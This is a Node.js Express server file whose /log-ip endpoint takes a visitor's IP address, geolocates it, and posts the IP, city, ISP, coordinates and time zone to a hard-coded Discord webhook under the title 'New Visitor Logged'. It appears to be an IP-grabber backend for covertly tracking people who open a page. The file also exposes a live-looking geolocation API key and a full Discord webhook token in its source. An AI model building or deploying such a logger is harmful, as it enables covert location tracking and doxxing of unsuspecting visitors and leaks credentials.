const express = require('express');
const axios = require('axios');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;
const API_KEY = 'b1cb23562a9d4701b432d04558b33e11';
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1316361436926181416/60VgX7lT4-_GVjyBzerPV2WLLinSsif2o8RETdYkYMnFQ1WpOzvwikkLhigY4TkTcUSt';

app.use(cors());
app.use(bodyParser.json());
const path = require('path');
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});


app.post('/log-ip', async (req, res) => {
    const { ip } = req.body;
    if (!ip) return res.status(400).json({ error: 'No IP provided' });

    try {
        const geoRes = await axios.get(`https://api.ipgeolocation.io/ipgeo?apiKey=${API_KEY}&ip=${ip}`);
        const geoData = geoRes.data;

        const embed = {
            title: "New Visitor Logged",
            color: 16711680, // Red color
            fields: [
                { name: "IP Address", value: geoData.ip, inline: true },
                { name: "Country", value: geoData.country_name, inline: true },
                { name: "City", value: geoData.city || "Unknown", inline: true },
                { name: "ISP", value: geoData.isp || "Unknown", inline: true },
                { name: "Coordinates", value: `${geoData.latitude}, ${geoData.longitude}`, inline: true },
                { name: "Time Zone", value: geoData.time_zone.name, inline: true }
            ],
            footer: { text: `Logged at ${new Date().toLocaleString()}` }
        };

        await axios.post(DISCORD_WEBHOOK, { embeds: [embed] });

        res.json({ message: "Logged successfully" });
    } catch (error) {
        console.error('Error fetching geolocation:', error);
        res.status(500).json({ error: "Failed to fetch geolocation" });
    }
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
